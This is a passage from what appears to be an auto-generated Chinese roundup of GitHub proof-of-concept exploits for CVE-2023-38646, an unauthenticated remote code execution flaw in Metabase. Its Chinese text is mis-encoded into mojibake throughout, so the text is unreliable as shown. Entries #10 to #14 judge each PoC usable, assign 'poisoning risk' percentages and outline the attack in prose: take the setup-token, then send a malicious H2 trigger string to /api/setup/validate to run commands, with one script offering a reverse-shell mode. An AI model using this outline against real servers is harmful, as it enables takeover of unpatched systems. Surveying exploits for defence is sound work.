æä¾›çš„ä»£ç ä¸»è¦æ˜¯åˆ©ç”¨æ¼æ´è·å–åå‘shellã€‚é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚åˆ é™¤æ–‡ä»¶ã€ä¼ æ’­æ¶æ„è½¯ä»¶ç­‰ã€‚ä»£ç ç»“æ„æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ã€‚è™½ç„¶ä»£ç æœ¬èº«æ˜¯ä¸ºäº†æ”»å‡»ï¼Œä½†å®ƒæ²¡æœ‰ä¸»åŠ¨è¿›è¡Œæ¶æ„ä¼ æ’­æˆ–å…¶ä»–ç ´åè¡Œä¸ºã€‚è€ƒè™‘åˆ°ä»£ç çš„åŠŸèƒ½ä¸»è¦æ˜¯æ¼æ´åˆ©ç”¨ï¼Œè€Œéæ¤å…¥åé—¨æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œå› æ­¤åˆ¤å®šå­˜åœ¨æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§è¾ƒä½ã€‚

è¯¥é¡¹ç›®ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œè¯„ä¼°ç»“æœä¸º1%ã€‚

**é¡¹ç›®åœ°å€:** [Mrunalkaran/CVE-2023-38646](https://github.com/Mrunalkaran/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #10

**æ¥æº**: [CVE-2023-38646-Pyr0sec_CVE-2023-38646.md](../2023/CVE-2023-38646-Pyr0sec_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (Open Source) å’Œ < 1.46.6.1 (Enterprise)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå—å½±å“ç‰ˆæœ¬çš„Metabaseï¼Œä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®è¯¥Metabaseå®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 2%

## è¯¦æƒ…

CVE-2023-38646æ˜¯ä¸€ä¸ªå­˜åœ¨äºMetabaseçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å¤šä¸ªä¿¡æ¯æ¥æºéƒ½ç¡®è®¤äº†æ­¤æ¼æ´çš„å­˜åœ¨å’Œé«˜å±æ€§ï¼Œå¹¶æä¾›äº†å¯åˆ©ç”¨çš„POCã€‚æ¼æ´åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„è¯·æ±‚ï¼Œè§¦å‘Metabaseä¸­çš„ååºåˆ—åŒ–æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š** æ¼æ´åº“ä¿¡æ¯å’Œå¤šä¸ªæœç´¢å¼•æ“ç»“æœè¡¨æ˜å­˜åœ¨å…¬å¼€å¯ç”¨çš„PoCï¼Œè¯æ˜äº†æ¼æ´çš„å¯åˆ©ç”¨æ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š** æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç åªåŒ…å«Apache Licenseã€‚å¹¶æ²¡æœ‰å‘ç°ä»»ä½•ç›´æ¥çš„æŠ•æ¯’ä»£ç ã€‚é€šå¸¸ï¼ŒæŠ•æ¯’å¯èƒ½å­˜åœ¨äºæ›´å¤æ‚çš„expæˆ–è€…åº“çš„ä¾èµ–ä¸­,ä¾‹å¦‚ï¼Œä¸€äº›å¼€å‘è€…å¯èƒ½åœ¨çœ‹ä¼¼æ— å®³çš„ä»£ç ä¸­åµŒå…¥åé—¨ï¼Œè¿™äº›åé—¨åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è¢«è§¦å‘ï¼Œä»è€Œå…è®¸æ”»å‡»è€…è¿œç¨‹æ§åˆ¶å—æ„ŸæŸ“çš„ç³»ç»Ÿã€‚æœ¬æ¬¡PoCçš„æŠ•æ¯’åˆ†æå æ¯”ä¸º2%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ç¡®å®šç›®æ ‡ï¼š** ç¡®å®šè¿è¡ŒMetabaseçš„æœåŠ¡å™¨ï¼Œå¹¶ç¡®è®¤å…¶ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ï¼ˆä½äº0.46.6.1çš„å¼€æºç‰ˆæœ¬æˆ–ä½äº1.46.6.1çš„ä¼ä¸šç‰ˆæœ¬ï¼‰ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** ä½¿ç”¨å·²çŸ¥çš„PoCæˆ–expæ„é€ åŒ…å«æ¶æ„ä»£ç çš„è¯·æ±‚ã€‚å…·ä½“çš„è¯·æ±‚æ ¼å¼å–å†³äºæ¼æ´çš„ç»†èŠ‚ï¼Œå¯èƒ½æ¶‰åŠå‘é€ç‰¹åˆ¶çš„JSONæ•°æ®ã€åˆ©ç”¨SQLæ³¨å…¥æˆ–å…¶ä»–ç±»å‹çš„æ¼æ´ã€‚
3.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ çš„æ¶æ„è¯·æ±‚å‘é€åˆ°MetabaseæœåŠ¡å™¨çš„ç‰¹å®šç«¯ç‚¹ã€‚
4.  **æ‰§è¡Œä»£ç ï¼š** å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒMetabaseæœåŠ¡å™¨å°†æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„ä»£ç ï¼Œä»è€Œå…è®¸æ”»å‡»è€…æ§åˆ¶æœåŠ¡å™¨ã€‚


**é¡¹ç›®åœ°å€:** [Pyr0sec/CVE-2023-38646](https://github.com/Pyr0sec/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #11

**æ¥æº**: [CVE-2023-38646-Red4mber_CVE-2023-38646.md](../2023/CVE-2023-38646-Red4mber_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æœªè¿›è¡Œç›¸åº”è¡¥ä¸ä¿®å¤ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹æ®Šçš„è¯·æ±‚åˆ©ç”¨æ­¤æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Tokenï¼š** æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` ç«¯ç‚¹å‘é€ GET è¯·æ±‚ï¼Œä»¥è·å– `setup-token`ã€‚è¿™ä¸ªtokenç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚ï¼š** æ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ SQL æ³¨å…¥çš„ JSON payloadï¼Œå¹¶å°†å…¶å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
    *   Payload çš„ `details` å­—æ®µåŒ…å«ä¸€ä¸ªæ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ `TRACE_LEVEL_SYSTEM_OUT=1` å¼€å¯äº†è·Ÿè¸ªï¼Œ`CREATE TRIGGER` ç”¨äºåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨æ—¶æ‰§è¡Œ JavaScript ä»£ç ã€‚
    *   JavaScript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç»è¿‡ Base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  **æ‰§è¡Œå‘½ä»¤ï¼š** å½“ Metabase å°è¯•éªŒè¯æ•°æ®åº“è¿æ¥æ—¶ï¼Œæ¶æ„ SQL æ³¨å…¥ä¼šè¢«è§¦å‘ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æä¾›çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æä¾›çš„PoCä»£ç æœ‰æ•ˆã€‚ä»£ç é€šè¿‡å‘é€æ¶æ„è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£æ¥è§¦å‘æ¼æ´ã€‚ä»£ç é¦–å…ˆé€šè¿‡`/api/session/properties`è·å–tokenï¼Œç„¶åä½¿ç”¨åŒ…å«æ¶æ„SQLæ³¨å…¥çš„JSONæ•°æ®åŒ…é€šè¿‡POSTæ–¹æ³•å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

è¯¥POCä»£ç ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´å®ç°RCEï¼Œæ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚
è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£é™©ï¼Œä½†æ˜¯payloadæ˜¯ç”±ä½¿ç”¨è€…æä¾›çš„ã€‚ä»£ç æœ¬èº«åªè´Ÿè´£æ„é€ å’Œå‘é€è¯·æ±‚ï¼Œé£é™©æ˜¯RCEæœ¬èº«å¸¦æ¥çš„ï¼Œè€Œä¸æ˜¯ä»£ç ä½œè€…æ¤å…¥çš„åé—¨ã€‚
å­˜åœ¨æä½çš„æŠ•æ¯’é£é™© (å¤§çº¦1%)ï¼Œè¯¥é£é™©æ¥è‡ªäºä½œè€…å¯èƒ½ä¼šåœ¨ä»£ç é€»è¾‘ä¸Šå­˜åœ¨ä¸€äº›éšè—çš„åé—¨ï¼Œä½†æ˜¯ä»£ç æ•´ä½“ç»“æ„å’Œé€»è¾‘éƒ½æ¯”è¾ƒç®€å•ï¼Œéšè—åé—¨çš„éš¾åº¦è¾ƒé«˜ã€‚


**é¡¹ç›®åœ°å€:** [Red4mber/CVE-2023-38646](https://github.com/Red4mber/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #12

**æ¥æº**: [CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md](../2023/CVE-2023-38646-Shisones_MetabaseRCE_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨å—å½±å“çš„ Metabase å®ä¾‹ä¸Šæ‰§è¡Œè¿œç¨‹ä»£ç ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨æœ‰æ•ˆã€‚åˆ©ç”¨æ–¹å¼æ¶‰åŠå‘é€ç‰¹åˆ¶çš„è¯·æ±‚åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å­˜åœ¨çš„æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å·²ç¡®è®¤å¹¶ä¸”å­˜åœ¨å¯åˆ©ç”¨çš„PoCã€‚æœç´¢å¼•æ“ç»“æœä¸­å¤šä¸ªé“¾æ¥æŒ‡å‘äº†æ¼æ´çš„è¯¦ç»†æè¿°ã€åˆ©ç”¨æ–¹æ³•å’ŒPoCä»£ç ï¼Œè¯æ˜äº†å…¶æœ‰æ•ˆæ€§ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„Cargo.lockæ–‡ä»¶åªæ˜¯Rusté¡¹ç›®çš„ä¾èµ–é”å®šæ–‡ä»¶ï¼Œæœ¬èº«ä¸åŒ…å«å¯æ‰§è¡Œä»£ç ã€‚è¯„ä¼°æŠ•æ¯’é£é™©éœ€è¦æŸ¥çœ‹å®Œæ•´çš„æºä»£ç ï¼Œä½†ä»…å‡­Cargo.lockæ–‡ä»¶å¾ˆéš¾åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚è€ƒè™‘åˆ°ç¼ºä¹ç›´æ¥çš„æ¶æ„ä»£ç è¯æ®ï¼Œä»¥åŠæ¼æ´åˆ©ç”¨ä¸»è¦ä¾èµ–äºMetabaseæœ¬èº«çš„æ¼æ´ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¼°è®¡ä¸º10%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

æ ¹æ®æœç´¢ç»“æœï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤æ¼æ´ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„æ¶æ„è¯·æ±‚åˆ°MetabaseæœåŠ¡å™¨ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ— éœ€èº«ä»½éªŒè¯å³å¯è§¦å‘æ­¤æ¼æ´ã€‚


**é¡¹ç›®åœ°å€:** [Shisones/MetabaseRCE_CVE-2023-38646](https://github.com/Shisones/MetabaseRCE_CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #13

**æ¥æº**: [CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md](../2023/CVE-2023-38646-UserConnecting_Exploit-CVE-2023-38646-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** 0.46.6.1ä¹‹å‰ (å¼€æºç‰ˆ), 1.46.6.1ä¹‹å‰ (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬å—å½±å“ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼š

1.  **æ¼æ´åŸç†ï¼š** è¯¥æ¼æ´å­˜åœ¨äº Metabase çš„ `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨äº† H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ’å…¥æ¶æ„ SQL è¯­å¥æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   **è·å– `setup-token`ï¼š**  é€šè¿‡è®¿é—® `/api/session/properties` è·å– `setup-token`ã€‚
    *   **æ„é€ æ¶æ„è¯·æ±‚ï¼š**  æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadï¼Œè¯¥è¿æ¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª `CREATE TRIGGER` è¯­å¥ï¼Œè¯¥è¯­å¥åœ¨æ¯æ¬¡æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` æ—¶æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
    *   **å‘é€è¯·æ±‚ï¼š**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚

3.  **POC åˆ†æï¼š** æä¾›çš„ Python è„šæœ¬ `metabase_exploit.py` å®ç°äº†ä¸Šè¿°æ­¥éª¤ï¼š
    *   å®ƒæ¥å— Metabase çš„ URLã€`setup-token`ã€æ“ä½œç±»å‹ï¼ˆ`exec` æˆ– `revshell`ï¼‰å’Œå‘½ä»¤ä½œä¸ºå‚æ•°ã€‚
    *   å®ƒä½¿ç”¨ `command_encoding` å‡½æ•°å¯¹å‘½ä»¤è¿›è¡Œ Base64 ç¼–ç ï¼Œå¹¶å¤„ç†å¡«å……å­—ç¬¦ `=`ã€‚
    *   å®ƒæ„é€ åŒ…å«æ¶æ„ H2 è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚
    *   å®ƒå‘é€ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ã€‚

4.  **æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æ¼æ´æè¿°å’Œæä¾›çš„ PoC ä»£ç ï¼Œè¯¥ PoC æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

5.  **æŠ•æ¯’é£é™©ï¼š**
    *   ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å¹¶å‘é€æ¶æ„è¯·æ±‚ï¼Œé£é™©è¾ƒä½ã€‚
    *   `command_encoding` å‡½æ•°çœ‹èµ·æ¥æ­£å¸¸ï¼Œç”¨äºé¿å…Base64ç¼–ç ä¸­çš„å¡«å……å­—ç¬¦çš„é—®é¢˜ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ä»–ç¼–ç æ¼æ´ã€‚
    *   ä»£ç æ˜ç¡®å£°æ˜ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ä½œè€…æ¤å…¥åé—¨çš„å¯èƒ½ã€‚
    *   æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œå¤§æ¦‚åœ¨1%å·¦å³ã€‚ä¸»è¦é£é™©åœ¨äºä½¿ç”¨è€…æ˜¯å¦ä¼šç”¨æ­¤ä»£ç æ‰§è¡Œéæ³•æ“ä½œã€‚

ç»¼ä¸Šæ‰€è¿°ï¼ŒCVE-2023-38646 æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æä¾›çš„ PoC ä»£ç å¯ä»¥æœ‰æ•ˆåˆ©ç”¨è¯¥æ¼æ´ï¼Œä½¿ç”¨è€…åº”è¯¥è°¨æ…å¯¹å¾…ï¼Œé¿å…æ»¥ç”¨ã€‚ä»£ç æœ¬èº«å…·æœ‰è½»å¾®çš„æŠ•æ¯’é£é™©ï¼Œä¸»è¦åœ¨äºç¼–ç å’Œå£°æ˜çš„å…è´£å£°æ˜ä¹‹é—´çš„æ½œåœ¨çŸ›ç›¾ã€‚

**é¡¹ç›®åœ°å€:** [UserConnecting/Exploit-CVE-2023-38646-Metabase](https://github.com/UserConnecting/Exploit-CVE-2023-38646-Metabase)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #14

**æ¥æº**: [CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md](../2023/CVE-2023-38646-XiaomingX_cve-2023-38646-poc.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®æˆ–å·²å®Œæˆåˆå§‹è®¾ç½®ä½†æœªæ‰§è¡Œåç»­å®‰å…¨åŠ å›ºã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´æè¿°å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨çš„æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´åˆ©ç”¨æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢å¼•æ“ç»“æœä»¥åŠæä¾›çš„PoCä»£ç ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚å­˜åœ¨å¤šä¸ªå…¬å¼€çš„PoCï¼Œè¯æ˜è¯¥æ¼æ´å¯ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-POC.py` æ—¨åœ¨è·å– Metabase å®ä¾‹çš„ setup-tokenã€‚å¦‚æœ Metabase å®ä¾‹å¤„äºæœªè®¾ç½®çŠ¶æ€ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤ token è¿›è¡Œåˆå§‹åŒ–è®¾ç½®ï¼Œå¹¶è¿›ä¸€æ­¥åˆ©ç”¨å…¶ RCE çš„èƒ½åŠ›ã€‚

æä¾›çš„PoCä»£ç  `CVE-2023-38646-Reverse-Shell.py` å¯èƒ½ç”¨äºæ›´è¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œå°è¯•è·å–Metabaseçš„ç‰ˆæœ¬ä¿¡æ¯å’Œsetup tokenã€‚

**æŠ•æ¯’é£é™©ï¼š**

PoC ä»£ç  `CVE-2023-38646-POC.py` ä¸»è¦åŠŸèƒ½æ˜¯å‘ç°æœªé…ç½®çš„ Metabase å®ä¾‹å¹¶è·å– setup tokenï¼Œæœ¬èº«æ²¡æœ‰æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚ ä½†æ˜¯ï¼Œä¸èƒ½å®Œå…¨æ’é™¤å…¶ä½œè€…åœ¨ä»£ç ä¸­éšè—æ¶æ„ä»£ç çš„å¯èƒ½æ€§ï¼Œä¾‹å¦‚åœ¨è·å– token åå°è¯•æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œæˆ–è€…å°† token å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨ã€‚é£é™©è¯„ä¼°ä¸º 10%ã€‚

PoC ä»£ç  `CVE-2023-38646-Reverse-Shell.py` åŒæ ·æ˜¯æ¼æ´åˆ©ç”¨ç›¸å…³ï¼Œä¸»è¦æ¶‰åŠè·å–setup tokenç­‰ä¿¡æ¯ã€‚éœ€è¦äººå·¥å®¡è®¡è¯¥éƒ¨åˆ†ä»£ç ï¼Œè¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  **ä¿¡æ¯æ”¶é›†ï¼š** æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡ Metabase å®ä¾‹çš„ç‰ˆæœ¬æ˜¯å¦åœ¨å—å½±å“çš„èŒƒå›´å†…ã€‚é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹å¯ä»¥è·å– Metabase ç‰ˆæœ¬ã€‚
2.  **è·å–Setup Token (å¦‚æœæœªè®¾ç½®):** å¦‚æœ Metabase å®ä¾‹å°šæœªå®Œæˆåˆå§‹åŒ–è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹è·å– setup-tokenã€‚è¿™ä¸ªtokenå¯ä»¥ç”¨æ¥å®ŒæˆMetabaseçš„åˆå§‹åŒ–ã€‚
3.  **æ‰§è¡Œä»»æ„ä»£ç ï¼š**  åˆ©ç”¨è·å–çš„setup tokenæˆ–è€…å…¶ä»–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è¯·æ±‚æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…·ä½“ RCE çš„åˆ©ç”¨æ–¹å¼å¯èƒ½æ¶‰åŠå¤šä¸ªæ­¥éª¤ï¼Œä¾‹å¦‚é€šè¿‡åˆ›å»ºä¸€ä¸ªæ¶æ„çš„æ•°æ®æºæˆ–ä»ªè¡¨æ¿ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚

æ€»è€Œè¨€ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨ç›¸å¯¹ç®€å•ï¼Œå±å®³æ€§æé«˜ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´å®Œå…¨æ§åˆ¶å—å½±å“çš„ Metabase æœåŠ¡å™¨ã€‚ 

**é¡¹ç›®åœ°å€:** [XiaomingX/cve-2023-38646-poc](https://github.com/XiaomingX/cve-2023-38646-poc)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #15

**æ¥æº**: [CVE-2023-38646-Zenmovie_CVE-2023-38646.md](../2023/CVE-2023-38646-Zenmovie_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

